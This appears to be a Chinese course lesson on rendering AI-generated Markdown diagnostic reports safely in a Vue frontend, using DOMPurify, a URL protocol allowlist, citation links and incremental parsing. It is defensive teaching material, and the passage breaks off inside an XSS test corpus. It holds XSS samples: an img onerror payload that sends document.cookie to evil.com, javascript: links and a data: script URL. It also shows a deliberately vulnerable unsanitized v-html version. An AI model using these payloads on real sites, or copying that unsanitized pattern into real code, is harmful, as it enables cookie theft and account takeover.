# Day 16：证据与 XSS（v1 裸渲染 Markdown → v2 白名单净化 + URL 协议校验 → v3 增量解析 + 证据链 + 长内容性能）

> **《90 天拆分规则说明》校正口径（本节优先于正文中的旧阶段编号和旧时间表）**
>
> - **路线位置**：阶段一（Day 1-30，前端 -> AI 前端）。所有 BFF、NestJS、数据库、队列和 Agent 后端增量都必须服务于 `p1-monitor` 的真实 AI 前端链路，不得另起无关 Demo。
> - **功能交付**：本日必须交付一个能跑、能测、能从用户入口观察结果的完整模块；知识点只能由该模块自然引出。
> - **三版演进**：正文 §3/§4/§5 分别对应 v1 最小闭环、v2 增加一个关键设计维度、v3 生产终态；v1/v2 必须写明可观察痛点，v3 必须解决这些痛点。
> - **时间盒**：本日执行 180 分钟标准时间盒：A/B/C 各 30 分钟（共 90 分钟阅读）；D 60 分钟、E 20 分钟、F 10 分钟（共 90 分钟动手）。正文其他旧时间表不再作为执行口径。
> - **累积复用**：开始前读取上一日 commit 和当前源码；当天新增合同必须复用已有事件、Schema、状态或持久化边界，禁止复制出第二套平行实现。
> - **验收门槛**：核心测试 + 两个产生不同可观察失败的反证实验 + 课末三问 + 至少两道真实项目情境题 + 提交后动态教师五连问，缺一项即不通过。

任务版本：标准版
日期与时长：2026-07-29 周三，180 分钟（90 分钟阅读 + 90 分钟动手）
项目：`D:\demo\ai-techer\p1-monitor\frontend`
角色视角：完成 Day 15 Agent 时间线（历史回放 + 派生状态 + 审计面板），第一次要把「模型生成的 Markdown 诊断报告」安全渲染到页面、并把每条结论链接回真实证据的开发者

---

## 0. 今天在 90 天路线中的位置

90 天转型路线的三个阶段：

```
阶段一（Day 1-30）：前端 → AI 前端
   项目：p1-monitor 智能运维监控（Vue 3 + TypeScript + WebSocket + Agent UI）
   Day 1-5：前端 Agent 运行时展示、状态机、WebSocket 实时
   Day 6-10：后端 Nest + Prisma + FSM + M2 门禁

阶段二（Day 31-60）：AI 前端 → AI 全栈
   项目：p1-monitor 后端 + p1-monitor 全栈（NestJS + LLM 集成 + RAG）
   Day 11：Tool Registry（Schema/超时/裁剪/审计）
   Day 12：Agent Loop（循环调用+预算+终止）
   Day 13：持久化 / 幂等（事务+幂等键+执行状态+恢复）
   Day 14：SSE 合同演进（AgentEventV1 + resume + 取消）
   Day 15：Agent 时间线（Event reducer + 派生状态 + 持久化恢复 + 审计 UI）
   Day 16：证据与 XSS（安全 Markdown + 证据链 + 长内容性能）  ← 今天在这里
   Day 17-20：LangChain RAG + 向量检索

阶段三（Day 61-90）：AI 全栈 → AI Agent 工程师
   项目：p2-agent-workbench 多 Agent 协同工作台
```

**Day 16 在阶段一第 6 天**。Day 12 让 Agent 循环调工具、Day 13 落库、Day 14/15 让事件实时推到前端并能回放。到今天为止，模型生成的最终诊断结论一直是**一段纯文本**塞在 timeline 的 `result` 卡片里。但真实产品里，模型输出的是 **Markdown**（带标题、列表、代码块、`[1]` 引用标记），而 Markdown 一旦用 `v-html` 直接渲染，就是 XSS 的头号入口。今天要解决两件事：**安全渲染**（模型输出不可信，等同用户输入）+ **证据链**（每条结论能点回真实的指标/异常/ToolCall）。

### 到 Day 15 结束时项目已具备的能力

- **前端时间线**（Day 15）：`useAgentTimeline` 编排历史 + SSE、派生 Run/Tool/Approval/RawEvents 四视图、审计面板、sessionStorage 恢复
- **后端持久化**（Day 13）：AgentRun / Diagnosis / ToolCall 三表落库，每条 ToolCall 有 `id`、`toolName`、`resultJson`
- **诊断结论的现状**：`Diagnosis.summary` 是一段字符串，前端拿到后直接当纯文本显示；模型其实已经在生成 Markdown（`## 诊断结论\n\n- CPU 持续超过阈值 [1]\n- ...`），但前端把 `##`、`-`、`[1]` 当普通字符显示，既丑又没有引用跳转
- **缺失的一块**：没有 Markdown 渲染层；没有 XSS 防护；模型说的"[1]"指向哪条 ToolCall 没人知道；30KB 的长报告流式渲染时每个 chunk 全量重新解析，CPU 飙高

### 今天要解决的 4 个问题

1. **问题 1：`v-html` 直接渲染模型 Markdown = XSS 门户大开**
   模型输出不可信——它可能被 prompt 注入、可能把用户上一轮粘贴的恶意内容复述出来、可能因为 RAG 检索到污染文档而生成 `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">`。如果前端 `<div v-html="markdownToHtml(summary)">`，浏览器会执行 `onerror` 里的脚本，窃取 Cookie、发起钓鱼跳转。**模型输出必须和用户输入一样，经过 Markdown 白名单解析 + DOMPurify 净化才能进 DOM**。

2. **问题 2：危险 URL 协议（`javascript:` / `data:`）绕过 HTML 净化**
   即使把 `<script>` 和 `onerror` 都过滤了，模型生成的 `[点这里查看详情](javascript:alert(document.cookie))` 仍然是活的——它是合法的 `<a>` 标签，但 `href` 里是 `javascript:` 伪协议。用户一点就中招。**必须对所有 `href` / `src` 做协议白名单校验（只允许 `http/https/mailto`）**。

3. **问题 3：证据链断裂——模型说的"[1]"指向哪里没人知道**
   模型输出"CPU 在 14:30 持续超过阈值 [1]，磁盘 IO 正常 [2]"。这里的 `[1]` `[2]` 应该分别链接到具体的 ToolCall（`getMetrics` 的返回）和 Anomaly 记录。如果只是显示 `[1]` 纯文本，运维无法验证"模型这个结论是基于哪条真实数据得出的"，诊断报告就成了不可信的黑盒。**必须把 `[n]` 解析成可点击的引用，点击后定位到审计面板里对应的 ToolCall / 指标 / 异常**。

4. **问题 4：长报告流式渲染 CPU 飙高**
   30KB 的诊断报告通过 SSE 一个 chunk 一个 chunk 推来。如果每收到一个 `text.delta` 就把**累积的全部文本**重新 `marked.parse()` 一遍，解析次数是 O(N²)（第 k 个 chunk 解析前 k 个 chunk 的全部内容）。报告越长越卡，CPU 到 95%，页面掉帧。**必须做增量解析 / 节流，只在必要时重新解析，或只解析新增部分**。

---

## 1. 今天要交付的功能模块

在 `p1-monitor/frontend` 里交付一个模块 **`agent/report`**：把模型生成的 Markdown 诊断报告安全渲染到诊断详情页。核心是一条**不可信内容 → 安全 DOM** 的净化管线（Markdown 白名单解析 → DOMPurify 净化 → URL 协议校验），加上把 `[n]` 引用标记解析成可点击链接、点击后跳转到审计面板对应证据的证据链机制，以及长报告的增量解析 + 节流渲染。

### 1.1 用户能看到什么

**场景**：运维工程师打开 `/runs/r-01` 诊断详情页，Agent 已经生成了一份 Markdown 诊断报告，其中混入了一段被污染的恶意内容。

```
模型原始输出（不可信）：

## 诊断结论

srv-042 在 14:28-14:30 CPU 持续超过 95% [1]，触发告警阈值 90% [2]。

建议措施：
- 检查该时间段进程列表 [3]
- <img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
- [查看完整报告](javascript:alert(document.cookie))

---

前端安全渲染后用户看到：

┌─────────────────────────────────────────┐
│ ## 诊断结论                                │
│                                            │
│ srv-042 在 14:28-14:30 CPU 持续超过 95%    │
│ [¹]，触发告警阈值 90% [²]。   ← [1][2]可点击 │
│                                            │
│ 建议措施：                                  │
│ • 检查该时间段进程列表 [³]                  │
│ • （恶意 <img onerror> 被净化，不渲染）      │
│ • 查看完整报告（javascript: 链接被拦截，     │
│   降级为纯文本，不可点击）                    │
└─────────────────────────────────────────┘

用户点击 [¹]：
  → 页面滚动到审计面板，高亮 ToolCall t-01 (getMetrics)
  → 展示原始返回：[{timestamp:"14:28",value:95.2},...]

DevTools Console：
  ✓ 恶意脚本执行数：0
  ✓ CSP 拦截报告：blocked img onerror
  ✓ 长报告（30KB）P95 渲染耗时：< 50ms/chunk
```

**用户观察到的最终结果**：
- Markdown 正常渲染（标题、列表、代码块有样式）
- 恶意 `<img onerror>` / `<script>` 被静默移除，不执行、不显示
- `javascript:` 链接降级为不可点击的纯文本
- `[1] [2] [3]` 变成可点击的上标引用，点击定位到审计面板对应证据
- 30KB 长报告流式渲染时不卡顿，CPU 平稳

### 1.2 这个模块在项目里承担什么

- **输入**：Day 15 派生视图里 `run-view` 的 `finalReport`（模型生成的 Markdown 字符串）+ Day 15 审计面板里的 `rawEventsView`（用于解析 `[n]` 引用指向的 ToolCall / Anomaly）
- **输出**：`ReportView.vue` 组件渲染出安全的、带可点击引用的诊断报告；一条可复用的净化管线 `sanitizeMarkdown(raw)`；一个引用解析器 `parseCitations(markdown, sources)`
- **对齐后续**：今天定义的 **净化管线**（`sanitize-pipeline.ts`）和 **证据链模型**（`Citation` / `CitationSource`）是 Day 17-20 LangChain RAG 回答展示（RAG 回答同样是不可信 Markdown + 引用来源文档）、Day 30 M3 端到端门禁（"任何展示给用户的模型输出都必须经过净化"）的安全地基。Day 30 会把"XSS 攻击语料测试通过率 100%"列为硬门禁

### 1.3 三版演进的目标

| 版本 | 实现的功能 | 代码结构 | 引入的知识 |
|---|---|---|---|
| **v1** | `marked` 解析 Markdown + `v-html` 渲染 | 单组件 `ReportView.vue` 里直接 `v-html="marked(summary)"` | Markdown 解析基础、`v-html` 的危险性 |
| **v1 痛点** | XSS 门户大开（`<img onerror>` 直接执行）；危险 URL 可点击；`[n]` 是死文本；长报告每 chunk 全量重解析 |  |  |
| **v2** | v1 + **DOMPurify 净化** + **URL 协议白名单** | 拆出 `sanitize/sanitize-pipeline.ts` + `sanitize/url-guard.ts` | HTML 白名单、DOMPurify 配置、URL 协议校验、净化管线的顺序 |
| **v2 痛点** | 证据链还没做（`[n]` 仍是纯文本）；长内容性能没优化（每 chunk 全量 `marked.parse`） |  |  |
| **v3** | v2 + **证据链**（`[n]` → 可点击引用 → 定位审计面板） + **增量解析 + 节流**（长报告 P95 < 50ms） | 完整分层（sanitize/citation/render/perf） | 引用解析（正则 + source 映射）、引用血缘（lineage）、增量解析、`requestIdleCallback` / 节流、Vue 性能优化 |

**用户最终在项目里交付的是 v3**。v1 和 v2 是教学用的过渡版本。

---

## 1.4 本日项目目录结构（动手前先看骨架）

**为什么放在最前面**：证据与 XSS 涉及前端 4 个关注点（Markdown 解析 / HTML 净化 + URL 校验 / 引用解析 + 证据链 / 长内容增量渲染），如果不先在脑子里立起骨架，写到一半就会把"解析 Markdown"和"净化 HTML"揉进同一个函数、把"URL 校验"漏在净化之外、把"引用解析"塞进 Vue 组件的 `computed`、把"节流"用一个散落的 `setTimeout` 糊上去。看完这棵树，下面章节再出现 `frontend/src/agent/report/sanitize/url-guard.ts` 时，你就能立刻定位它是"净化层"里专管 URL 协议的一个纯函数。

**今天在 `p1-monitor/frontend/src/` 下要建立的完整目录树（v3 完整版）**：

```
frontend/src/
├── agent/
│   ├── report/                                 ← 【新增】诊断报告安全渲染模块
│   │   ├── sanitize/
│   │   │   ├── sanitize-pipeline.ts            ← 净化管线（marked → DOMPurify）
│   │   │   ├── sanitize-pipeline.spec.ts       ← 净化管线单元测试（含 XSS 语料）
│   │   │   ├── url-guard.ts                    ← URL 协议白名单（纯函数）
│   │   │   ├── url-guard.spec.ts               ← URL 校验单元测试
│   │   │   └── xss-corpus.ts                   ← 12 类 XSS 攻击语料（测试固件）
│   │   ├── citation/
│   │   │   ├── citation.types.ts               ← Citation / CitationSource 类型
│   │   │   ├── parse-citations.ts              ← 解析 [n] → 引用（纯函数）
│   │   │   ├── parse-citations.spec.ts         ← 引用解析单元测试
│   │   │   └── resolve-source.ts               ← [n] → ToolCall/Anomaly 映射（纯函数）
│   │   ├── perf/
│   │   │   ├── incremental-markdown.ts         ← 增量解析（只解析块级增量）
│   │   │   └── incremental-markdown.spec.ts    ← 增量解析单元测试
│   │   ├── ui/
│   │   │   ├── ReportView.vue                  ← 报告渲染组件（用净化后的 HTML）
│   │   │   └── CitationLink.vue                ← 单个可点击引用组件
│   │   ├── useReport.ts                        ← 编排 composable（净化 + 引用 + 节流）
│   │   └── index.ts                            ← 桶文件
│   ├── reducer/derived/                         ← 【Day 15 已有】派生视图
│   │   ├── run-view.ts                          ← 【Day 15 已有】提供 finalReport
│   │   └── raw-events-view.ts                   ← 【Day 15 已有】提供引用 source
│   └── ...
├── features/agent-run/ui/AgentRunPanel.vue      ← 【Day 15 已有，v3 微调】挂 ReportView
└── main.ts                                       ← 【已有】需要在 index.html 加 CSP meta
```

**三版演进对应的文件差异**：

| 文件 | v1 | v2 | v3 |
|---|---|---|---|
| `ui/ReportView.vue` | ✓ `v-html="marked(raw)"` | ✓ `v-html="sanitize(raw)"` | ✓ 渲染净化 HTML + 引用挂载点 |
| `sanitize/sanitize-pipeline.ts` | ✗ | ✓ marked + DOMPurify | ✓ 同 v2 |
| `sanitize/url-guard.ts` | ✗ | ✓ 协议白名单 | ✓ 同 v2 |
| `sanitize/xss-corpus.ts` | ✗ | ✓ 12 类语料 | ✓ 同 v2 |
| `citation/parse-citations.ts` | ✗ | ✗ | ✓ 正则解析 [n] |
| `citation/resolve-source.ts` | ✗ | ✗ | ✓ [n] → source 映射 |
| `ui/CitationLink.vue` | ✗ | ✗ | ✓ 可点击引用组件 |
| `perf/incremental-markdown.ts` | ✗ | ✗ | ✓ 增量解析 + 节流 |
| `useReport.ts` | ✗ | ✗ | ✓ 编排层 |
| `index.html` CSP meta | ✗ | ✗ | ✓ Content-Security-Policy |

**依赖方向（务必单向，反过来一次都不行）**：

```
features/agent-run/ui/AgentRunPanel.vue
        │
        ▼
agent/report/ui/ReportView.vue
        │
        ▼
agent/report/useReport.ts                    ← 编排：净化 → 解析引用 → 节流
        │
        ├─► agent/report/sanitize/sanitize-pipeline.ts   ← marked + DOMPurify
        │           │
        │           └─► agent/report/sanitize/url-guard.ts   ← URL 协议白名单（纯函数）
        │
        ├─► agent/report/citation/parse-citations.ts    ← 正则解析 [n]（纯函数）
        │           │
        │           └─► agent/report/citation/resolve-source.ts  ← [n]→source（纯函数）
        │                       │
        │                       └─► citation/citation.types.ts   ← 纯类型
        │
        └─► agent/report/perf/incremental-markdown.ts   ← 增量解析（纯函数）

agent/report/ui/CitationLink.vue
        │
        └─► citation/citation.types.ts        ← 只依赖类型

sanitize/*.ts    ← 只依赖 marked / dompurify，不 import Vue
citation/*.ts    ← 纯函数，不 import Vue、不 import DOM
perf/*.ts        ← 纯函数，不 import Vue
```

**红线**：
- `sanitize/url-guard.ts` 里出现 `import DOMPurify` 是塌方——URL 协议校验是独立的纯字符串判断，必须能脱离 DOM 单测
- `citation/parse-citations.ts` 里出现 `import { ref } from 'vue'` 或 `document.querySelector` 是塌方——引用解析只做"字符串 → 结构化引用数组"的投影
- `ui/ReportView.vue` 里直接 `v-html="marked(raw)"`（跳过 `sanitize-pipeline`）是塌方，也是本日最严重的安全事故——**任何进入 `v-html` 的内容必须先过净化管线**
- 在净化之后再拼接字符串（例如净化完再 `html.replace('[1]', '<a href=...>')` 手动插 HTML）是塌方——二次拼接会重新引入注入点；引用必须在净化管线内、用 DOMPurify 允许的标签表达

**动手前先问自己 3 个问题**：

1. `url-guard.ts` 为什么要独立于 DOMPurify？DOMPurify 不是已经能过滤危险属性了吗？—— 见 §5.4 知识点 2「URL 协议校验是 HTML 净化的补充而非替代」
2. 引用解析为什么放在净化**之后**做，而不是净化之前？—— 见 §5.4 知识点 4「净化与引用的顺序」
3. 长报告为什么不能每个 chunk 都 `marked.parse` 全量文本？O(N²) 具体差多少？—— 见 §5.4 知识点 6「增量解析与节流」

---

## 1.5 阶段 D：动手脚手架（20 分钟，先搭骨架再看正文）

### 1.5.1 D-1：装依赖（3 分钟）

按第 5.3 节的代码：

- `pnpm --filter frontend add marked dompurify`
- `pnpm --filter frontend add -D @types/dompurify`
- 确认版本：`marked` ≥ 12（旧版 API 不同）、`dompurify` ≥ 3
- 注意：`marked` 从 v5 起解析是同步的，`marked.parse(str)` 直接返回 string

**边写边问自己**：

- 为什么用 DOMPurify 而不是自己写正则过滤 `<script>`？（XSS 的绕过方式有几百种：`<ScRiPt>`、`<img onerror>`、`<svg onload>`、`<iframe srcdoc>`、HTML 实体编码……自己写正则永远漏；DOMPurify 是浏览器 DOM 解析 + 白名单，从原理上封死）
- 为什么 marked 和 DOMPurify 要分两步而不是找一个"安全的 Markdown 库"？（关注点分离：marked 负责 md→html 语法转换，DOMPurify 负责 html→安全 html；各自可替换、各自可单测）

### 1.5.2 D-2：创建目录（2 分钟）

按第 5.3 节的目录树，在 `frontend/src/agent/report/` 下建 4 个子目录：

```
report/
├── sanitize/     ← 净化管线 + URL 校验 + XSS 语料
├── citation/     ← 引用解析 + source 映射
├── perf/         ← 增量解析
└── ui/           ← ReportView + CitationLink
```

**边写边问自己**：

- 为什么 `sanitize/` 和 `citation/` 分开？（净化是"安全边界"，引用是"业务语义"；一个防攻击、一个做产品功能，混在一起就无法独立测 XSS 语料）
- 为什么 `xss-corpus.ts`（攻击语料）放在 `sanitize/` 而不是 `__tests__/`？（语料是"净化管线的规格说明"——它定义了"必须挡住哪些攻击"，属于净化模块的一部分，未来 p2 复用净化管线时语料一起搬走）

### 1.5.3 D-3：写 sanitize 层（5 分钟）

按第 5.3 节的代码：

- 写 `sanitize/url-guard.ts`（`isSafeUrl(url): boolean`，纯函数）
- 写 `sanitize/sanitize-pipeline.ts`（`sanitizeMarkdown(raw): string`）
- 写 `sanitize/xss-corpus.ts`（12 类攻击语料数组）

**边写边问自己**：

- `isSafeUrl` 为什么只白名单 `http/https/mailto`，而不是黑名单 `javascript/data`？（白名单是"默认拒绝"——新出现的危险协议（如 `vbscript:`、`file:`）自动被挡；黑名单永远追不上新攻击）
- DOMPurify 的 `ALLOWED_TAGS` 里为什么没有 `<style>` 和 `<form>`？（`<style>` 可以做 CSS 注入攻击、`<form>` 可以做钓鱼提交；诊断报告根本不需要它们）
- DOMPurify 的 hook（`afterSanitizeAttributes`）为什么还要再校验一次 `href`？（DOMPurify 默认允许 `<a href>`，但它对 `javascript:` 的拦截依赖配置；我们在 hook 里用自己的 `isSafeUrl` 做纵深防御，双保险）

### 1.5.4 D-4：写 citation 层（5 分钟）

按第 5.3 节的代码：

- 写 `citation/citation.types.ts`（`Citation` / `CitationSource` 类型）
- 写 `citation/resolve-source.ts`（`resolveSource(index, sources): CitationSource | null`）
- 写 `citation/parse-citations.ts`（`parseCitations(html, sources): { html, citations }`）
- 写 `citation/parse-citations.spec.ts`

**边写边问自己**：

- 引用解析为什么接收的是 `html`（净化后）而不是 `markdown`（原始）？（净化后 `[1]` 仍是纯文本，此时替换成 `<sup>` 是安全的；如果在净化前替换，插入的 HTML 又要再净化一次，顺序反了）
- `resolveSource` 为什么是纯函数、返回 `null` 而不是抛错？（`[99]` 引用了不存在的 source 是常见情况——模型幻觉；返回 null 让 UI 降级为不可点击的纯文本，而不是整个报告崩溃）
- `Citation` 里为什么要存 `sourceVersion`？（证据血缘：如果 ToolCall 的结果后来被修正过，引用要能标注"此引用基于 v1 版本的数据"，避免结论和最新数据对不上还甩锅给模型）

### 1.5.5 D-5：写 perf + useReport + UI（5 分钟）

按第 5.3 节的代码：

- 写 `perf/incremental-markdown.ts`（`createIncrementalParser()`）
- 写 `report/useReport.ts`（编排：净化 → 引用 → 节流）
- 写 `report/ui/CitationLink.vue`
- 写 `report/ui/ReportView.vue`
- 改 `features/agent-run/ui/AgentRunPanel.vue`（挂 `ReportView`）
- 在 `index.html` 加 CSP `<meta>`

**边写边问自己**：

- 增量解析器为什么要按"块级边界"（`\n\n`）切分而不是按字符？（Markdown 的块（段落/列表/代码块）是解析单位；在块中间切会解析出错误的 HTML；只有遇到完整的块边界才能安全地增量解析）
- `useReport` 为什么用 `requestAnimationFrame` 节流而不是 `setTimeout(fn, 16)`？（rAF 和浏览器渲染帧对齐，不会在同一帧内解析两次；`setTimeout` 可能在一帧内触发多次或错过帧）
- CSP `<meta>` 和净化管线是重复的吗？（不是——CSP 是"浏览器层"的最后防线（即使 JS 漏了，浏览器也不执行内联脚本），净化是"应用层"防线；纵深防御，两层都要）

---

## 2. 学习节奏（90 阅读 / 90 动手）

| 阶段 | 时长 | 内容 | 交付物 |
|---|---|---|---|
| A：读原理 | 25 min | §3-§5 三版演进 + §5.4 知识点 6 项 | 心里能画出"裸渲染 → 净化 → 证据链 + 性能"的演进路径 |
| B：读代码 | 30 min | §5.3 逐文件通读，特别是 `sanitize-pipeline.ts` 和 `parse-citations.ts` | 能口述"一段恶意 Markdown 经过管线的每一步变化"、"[n] 如何映射到 ToolCall" |
| C：读深挖 | 35 min | §6.5 前端底子补弱（`Day16深挖-前端底子补弱.html`） | 能回答"DOMPurify 底层用什么解析 HTML"、"CSP 的各个指令含义" |
| D：动手脚手架 | 20 min | §1.5 D-1 到 D-5 | 骨架文件全部创建，`pnpm --filter frontend build` 通过 |
| E：写核心测试 | 20 min | §7.6 三个 spec 文件 + 12 类 XSS 语料 | `pnpm --filter frontend test report` 全绿（含 XSS 语料执行数为 0） |
| F-1：反证 1 | 5 min | §7.7 手动把 `v-html="sanitize(raw)"` 改回 `v-html="marked(raw)"`，喂 XSS 语料 | 观察 `<img onerror>` 真的执行了，验证"没有净化是什么样子" |
| F-2：反证 2 | 5 min | §7.8 手动去掉 `url-guard`，喂 `javascript:` 链接 | 观察点击链接弹窗，验证"只靠 DOMPurify 默认配置不够" |
| F-3：验证 + 提交 | 10 min | §7.9 四件套 + commit | commit 含 `Refs: Day16` |

**总计**：90 阅读（A+B+C）+ 90 动手（D+E+F）= 180 min

---

## 3. v1：最小闭环（marked + v-html 裸渲染）

### 3.1 v1 要实现什么

模型生成的 `Diagnosis.summary` 是 Markdown 字符串。v1 只做一件事：**用 `marked` 把它解析成 HTML，用 `v-html` 渲染出来**，让标题、列表、代码块有样式。

**目标**：
- `ReportView.vue` 接收 `raw: string`（模型的 Markdown）
- `marked.parse(raw)` 转成 HTML
- `v-html` 渲染，页面显示带格式的报告

**不做**：
- 不做任何净化（这就是 v1 的"痛点演示"）
- 不解析 `[n]` 引用（纯文本显示）
- 不做长内容性能优化

### 3.2 v1 目录结构

```
frontend/src/agent/report/
└── ui/ReportView.vue          ← 唯一文件：marked + v-html
```

### 3.3 v1 完整代码

**frontend/src/agent/report/ui/ReportView.vue（v1 全文）**

```vue
<script setup lang="ts">
import { computed } from 'vue'
import { marked } from 'marked'

const props = defineProps<{ raw: string }>()

// v1：直接把 Markdown 解析成 HTML
// marked v5+ 的 parse 是同步的，返回 string
const html = computed(() => marked.parse(props.raw) as string)
</script>

<template>
  <!-- 危险！v-html 会执行 HTML 里的任何脚本 -->
  <article class="report" v-html="html"></article>
</template>

<style scoped>
.report {
  line-height: 1.6;
}
.report :deep(h2) {
  font-size: 1.2rem;
  margin: 1rem 0 0.5rem;
}
.report :deep(ul) {
  padding-left: 1.2rem;
}
.report :deep(code) {
  background: #f5f5f5;
  padding: 0.1rem 0.3rem;
  border-radius: 3px;
}
</style>
```

**frontend/src/features/agent-run/ui/AgentRunPanel.vue（v1 增量：挂载 ReportView）**

```vue
<!-- 在 Day 15 的 AgentRunPanel.vue 里，把 result 卡片替换成 ReportView -->
<script setup lang="ts">
// ... Day 15 已有的 useAgentTimeline 编排 ...
import ReportView from '@/agent/report/ui/ReportView.vue'

// runView.finalReport 是模型生成的 Markdown 字符串（Day 15 派生视图提供）
</script>

<template>
  <!-- ... Day 15 已有的时间线、Tool 卡片、审批面板 ... -->

  <section v-if="runView.finalReport" aria-labelledby="report-title">
    <h3 id="report-title">诊断报告</h3>
    <ReportView :raw="runView.finalReport" />
  </section>
</template>
```

### 3.4 v1 暴露的痛点

**痛点 1：`v-html` 直接执行恶意脚本（严重安全事故）**

模型输出里如果有 `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">`，`marked` 会原样保留这个 `<img>` 标签（Markdown 允许内联 HTML），`v-html` 渲染时浏览器加载图片失败触发 `onerror`，脚本执行，用户 Cookie 被发到攻击者服务器。这是**可以直接盗号的严重漏洞**。

**痛点 2：危险 URL 协议可点击**

模型输出 `[查看详情](javascript:alert(document.cookie))`，marked 生成 `<a href="javascript:alert(document.cookie)">查看详情</a>`，`v-html` 渲染后这是一个活的链接，用户一点就执行脚本。

**痛点 3：`[n]` 引用是死文本**

模型说"CPU 超阈值 [1]"，`[1]` 只是普通字符，运维无法点击验证"这个结论基于哪条真实数据"。诊断报告失去可信度——模型说什么就是什么，没有证据支撑。

**痛点 4：长报告每 chunk 全量重解析**

诊断报告通过 SSE 流式推送，`raw` 每次 `text.delta` 都增长。v1 的 `computed(() => marked.parse(props.raw))` 在 `raw` 每次变化时都把**累积的全部文本**重新解析。30KB 报告分 200 个 chunk 推来，就要解析 200 次，每次解析的文本越来越长，总计算量 O(N²)，CPU 飙到 95%，页面卡顿掉帧。

---

## 4. v2：加 DOMPurify 净化 + URL 协议白名单

### 4.1 v2 要实现什么

用户视角：模型输出里的恶意脚本被剥离，报告只保留安全的格式（标题/列表/代码/安全链接），页面不再执行任何注入脚本。

**目标**：
- marked 解析后，用 DOMPurify 过滤危险标签和属性
- 用 `isSafeUrl` 白名单校验所有 `<a href>` 和 `<img src>`
- 12 类 XSS 语料喂进来，执行数为 0

**依然不做**：
- 不解析 `[n]` 引用（还是死文本）
- 不做增量解析（长内容性能仍是 O(N²)）

### 4.2 v2 目录结构

```
frontend/src/agent/report/
├── sanitize/
│   ├── url-guard.ts            ← 新增：URL 协议白名单（纯函数）
│   ├── url-guard.spec.ts       ← 新增
│   ├── sanitize-pipeline.ts    ← 新增：marked + DOMPurify 管线
│   ├── sanitize-pipeline.spec.ts ← 新增
│   └── xss-corpus.ts           ← 新增：12 类攻击语料
└── ui/ReportView.vue           ← 改：调 sanitizeMarkdown
```

### 4.3 v2 完整代码

**frontend/src/agent/report/sanitize/url-guard.ts（v2 全文）**

```typescript
/**
 * URL 协议白名单校验。
 * 只允许 http / https / mailto，其他一律拒绝。
 * 白名单策略：新出现的危险协议（vbscript: / file: / blob: 等）自动被挡。
 *
 * 纯函数：不依赖 DOM、不依赖网络，100% 单测。
 */
const SAFE_PROTOCOLS = new Set(['http:', 'https:', 'mailto:'])

export function isSafeUrl(rawUrl: string): boolean {
  const trimmed = rawUrl.trim()

  // 相对路径（不含协议）视为安全：/api/x、./a、../b、#anchor
  if (
    trimmed.startsWith('/') ||
    trimmed.startsWith('./') ||
    trimmed.startsWith('../') ||
    trimmed.startsWith('#')
  ) {
    return true
  }

  try {
    // 用 URL 解析拿到协议；解析失败说明不是合法绝对 URL
    const parsed = new URL(trimmed)
    return SAFE_PROTOCOLS.has(parsed.protocol.toLowerCase())
  } catch {
    // 无法解析的（例如 "javascript:alert(1)" 在某些环境能解析出 javascript: 协议）
    // 交给 SAFE_PROTOCOLS 判定；解析异常的一律拒绝
    return false
  }
}
```

**frontend/src/agent/report/sanitize/url-guard.spec.ts（v2 全文）**

```typescript
import { describe, it, expect } from 'vitest'
import { isSafeUrl } from './url-guard'

describe('isSafeUrl', () => {
  it('允许 http/https/mailto', () => {
    expect(isSafeUrl('https://example.com')).toBe(true)
    expect(isSafeUrl('http://example.com/path?q=1')).toBe(true)
    expect(isSafeUrl('mailto:ops@example.com')).toBe(true)
  })

  it('允许相对路径和锚点', () => {
    expect(isSafeUrl('/agent/runs/r-01')).toBe(true)
    expect(isSafeUrl('./detail')).toBe(true)
    expect(isSafeUrl('#section-2')).toBe(true)
  })

  it('拒绝 javascript: 协议', () => {
    expect(isSafeUrl('javascript:alert(document.cookie)')).toBe(false)
    expect(isSafeUrl('JavaScript:alert(1)')).toBe(false)
    expect(isSafeUrl('  javascript:alert(1)  ')).toBe(false)
  })

  it('拒绝 data: 和其他危险协议', () => {
    expect(isSafeUrl('data:text/html,<script>alert(1)</script>')).toBe(false)
    expect(isSafeUrl('vbscript:msgbox(1)')).toBe(false)
    expect(isSafeUrl('file:///etc/passwd')).toBe(false)
  })
})
```

**frontend/src/agent/report/sanitize/sanitize-pipeline.ts（v2 全文）**

```typescript
import { marked } from 'marked'
import DOMPurify from 'dompurify'
import { isSafeUrl } from './url-guard'

// 报告允许的标签白名单：只保留展示格式，无 script/style/form/iframe
const ALLOWED_TAGS = [
  'h1', 'h2', 'h3', 'h4', 'p', 'br', 'hr',
  'strong', 'em', 'del', 'blockquote',
  'ul', 'ol', 'li',
  'code', 'pre',
  'a', 'img',
  'table', 'thead', 'tbody', 'tr', 'th', 'td',
  'sup', 'span',
]

const ALLOWED_ATTR = ['href', 'src', 'alt', 'title', 'class', 'data-citation']

// 注册一次 hook：净化属性后，用自己的 isSafeUrl 再校验 href/src（纵深防御）
let hookRegistered = false
function ensureHook(): void {
  if (hookRegistered) return
  DOMPurify.addHook('afterSanitizeAttributes', (node) => {
    const el = node as Element
    for (const attr of ['href', 'src']) {
      const value = el.getAttribute(attr)
      if (value && !isSafeUrl(value)) {
        el.removeAttribute(attr)
      }
    }
    // 外链统一加 rel，避免 tabnabbing
    if (el.tagName === 'A' && el.getAttribute('href')) {
      el.setAttribute('rel', 'noopener noreferrer')
    }
  })
  hookRegistered = true
}

/**
 * 净化管线：Markdown → HTML → 安全 HTML
 * 步骤：
 *   1. marked 解析 Markdown 语法
 *   2. DOMPurify 用白名单剥离危险标签/属性
 *   3. hook 里用 isSafeUrl 二次校验 URL 协议
 */
export function sanitizeMarkdown(raw: string): string {
  ensureHook()
  const dirtyHtml = marked.parse(raw) as string
  return DOMPurify.sanitize(dirtyHtml, {
    ALLOWED_TAGS,
    ALLOWED_ATTR,
    // 禁止 data: URI（图片除外的场景可再收紧）
    ALLOW_DATA_ATTR: false,
  })
}
```

**frontend/src/agent/report/sanitize/xss-corpus.ts（v2 全文，12 类攻击语料）**

```typescript
/**
 * 12 类恶意内容攻击语料。
 * 这是净化管线的"规格说明"：定义了必须挡住哪些攻击。
 * 每条语料经过 sanitizeMarkdown 后，都不应出现可执行脚本或危险协议。
 */
export interface XssCase {
  name: string
  input: string
  // 净化后 HTML 里绝对不能包含的片段
  mustNotContain: string[]
}

export const XSS_CORPUS: XssCase[] = [
  {
    name: '01 script 标签',
    input: '正常文本<script>alert(document.cookie)</script>',
    mustNotContain: ['<script', 'alert('],
  },
  {
    name: '02 img onerror',
